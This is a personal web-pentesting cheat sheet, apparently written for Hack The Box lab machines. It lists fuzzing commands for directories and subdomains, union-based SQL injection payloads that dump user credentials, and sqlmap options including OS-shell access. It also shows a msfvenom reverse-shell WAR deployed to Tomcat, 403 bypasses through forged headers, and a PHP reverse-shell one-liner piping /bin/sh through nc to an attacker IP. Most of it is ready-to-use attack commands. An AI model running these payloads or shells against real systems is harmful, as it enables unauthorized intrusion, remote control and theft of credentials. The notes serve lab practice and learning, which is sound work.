---
sidebar_position: 2
---

# Web 

## Scanning

When given a url, domain, or ip with http port, do some web scanning to find additional endpoints, folders, or whatever potentially accessible paths. 

:::tip My tip

If you get a 403 on one dir, try enumerating more dirs and files UNDER that 403 dir!

:::

Fav wordlists for different purposes:
* `/usr/share/dirb/wordlists/common.txt`
* `/usr/share/wordlists/rockyou.txt`

For fast scanning with multiple file extension prefixes, I personally think dirbuster is easier, but I'm more used to copy-pasting wfuzz commands.

### Wfuzz

Find directory

```bash
wfuzz -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -Z --hc 404 https://ip.htb/FUZZ
```

Find files (php)

```bash
wfuzz -w /usr/share/seclists/Discovery/Web-Content/PHP.fuzz.txt --hc 404 https://laboratory.htb/FUZZ
```

Find files (apache)

```bash
wfuzz -w /usr/share/seclists/Discovery/Web-Content/Apache.fuzz.txt -Z --hc 404,500 http://academy.htb/FUZZ
```

Find subdomain

```bash
wfuzz -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -H "Host: FUZZ.academy.htb" --hc 404,302 --hw 356 -t 100 10.10.10.215

wfuzz -c -f sub-fighter -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u 'http://target.tld' -H "Host: FUZZ.target.tld" --hw 290
```

### Other scanners

```bash
feroxbuster -u https://10.10.10.250:443 -t 10 -w /usr/share/seclists/Discovery/Web-Content/big.txt -x "txt,html,php,asp,aspx,jsp" -v -k -n -o /home/unicorn011/Desktop/HTB/seal/results/10.10.10.250/scans/tcp_443_https_feroxbuster_big.txt
```

## File inclusion

## SQL injection

:::tip My tip

For MSSQL, NO DOUBLE QUOTES! USE DOUBLE SINGLE QUOTES!!

:::

### Manual

Awesome cheatsheets:
* [Pentest Monkey](https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)
* [Payload All the Things](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

#### MySQL

Start with finding number of columns. For example, using union-based select statement + order by until SQL error:

```SQL
union select * from price order by 1
union select * from price order by 2
...
```

Find databases:
```SQL
union select 1,group_concat(0x7c,schema_name,0x7c),3,4,5,6,7,8,9 from information_schema.schemata
```

Find tables:
```SQL
union select 1,group_concat(0x7c,table_name,0x7c),3,4,5,6,7,8,9 fRoM information_schema.tables where table_schema="web"
```

Find columns:
```SQL
union select 1,group_concat(0x7c,schema_name,0x7c),3,4,5,6,7,8,9 fRoM information_schema.columns where table_name="backend_users"
```

Read data:
```SQL
union select 1,group_concat(0x7c,username,0x7c),group_concat(0x7c,password,0x7c),4,5,6,7,group_concat(0x7c,description,0x7c),9 fRoM backend_users
```

### Tools

Wfuzz
```bash
wfuzz -c -z file,/usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt -d "username=FUZZ&password=ss" --hc 200 -u http://admin.cronos.htb/index.php
```

SQLmap:
* [official usage tutorial](https://github.com/sqlmapproject/sqlmap/wiki/Usage)
* [cheatsheets](https://thedarksource.com/sqlmap-cheat-sheet/)

GET
```bash
sqlmap -u "https://target_site.com/page?p1=value1&p2=value2" -p p1
```

POST
```bash
sqlmap -u http://10.10.10.58:3000/api/session/authenticate --data "username=1&password=2" -p "username,password" --method POST
```
Can also export from Burp with 'Copy to File', then import into sqlmap with `sqlmap -r <file>`. Remember to remove injection payload in file first.

Useful options:
* listing stuff
    * dbs: `--dbs`
    * tables: `-D <target DB> --tables`
    * columns: `-D <target DB> -T <target table> --columns`
* dumping
    * a specific column: `-D <target DB> -T <target table> -C "Col1,Col2" --dump`
    * everything(READ: will take FOREVER): `--dump`
* get shell
    * get os shell: `--os-shell`
    * get SQL shell: `--sqlmap-shell`

## Other Tips

1. If running Tomcat and we have credentials, deploy war file with reverse shell like [this](https://stackoverflow.com/questions/4432684/tomcat-manager-remote-deploy-script)

    ```
    # generate reverse shell
    msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.2 LPORT=1234 -f war -o shell.war

    # tomcat 6
    curl --upload-file target\debug.war "http://tomcat:tomcat@localhost:8088/manager/deploy?path=/debug&update=true"

    # tomcat 7 & 8
    curl -v -u some_user:some_password -T /../my_app.war 'http://127.0.0.1:tomcat_port/manager/text/deploy?path=/my_app&update=true'

    then visit http://webite/shell
    ```

2. Bypass 403 with forged IP headers, such as `X-Forwarded-For`, `X-Client-IP`, `X-Remote-Addr`
3. Upload web.config to get RCE: [Uploading web.config For Fun and Profit](https://soroush.secproject.com/blog/2019/08/uploading-web-config-for-fun-and-profit-2/)
4. If `/cgi-bin` exists, try scanning for `.sh .pl .cgi` files under it. (Try common.txt wordlist) There might be `shellshock`!
5. Stable PHP reverse shell: `passthru("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 4444 >/tmp/f");`